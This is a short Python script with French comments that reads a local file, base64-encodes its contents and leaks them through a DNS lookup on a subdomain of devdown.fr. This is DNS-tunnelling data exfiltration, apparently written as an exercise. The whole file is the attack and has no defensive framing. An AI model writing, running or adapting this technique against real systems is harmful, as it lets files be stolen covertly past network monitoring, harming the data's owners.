#/usr/bin/env python3
import socket
import base64
f = open("toOut/test.txt", "r") #on ouvre le fichier à exflitrer
socket.gethostbyname(base64.b64encode(f.read().encode("utf-8")).decode("utf-8")+".devdown.fr") #on encode le fichier en base64 et on fait une requete dns sur XXXX.devdown.fr (xxxx est le fichier encoder en base 64)
f.close() #on ferme le fichier
